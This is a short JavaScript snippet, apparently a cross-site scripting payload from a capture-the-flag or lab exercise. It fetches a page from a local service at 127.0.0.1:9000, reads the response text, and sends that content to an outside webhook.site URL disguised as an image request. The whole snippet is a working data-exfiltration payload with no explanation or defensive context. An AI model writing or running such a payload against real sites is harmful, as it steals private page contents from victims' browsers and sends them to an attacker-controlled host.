
fetch("http://127.0.0.1:9000/view/129c0456-96c8-4afc-ac2c-9e21a94367d9").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
})
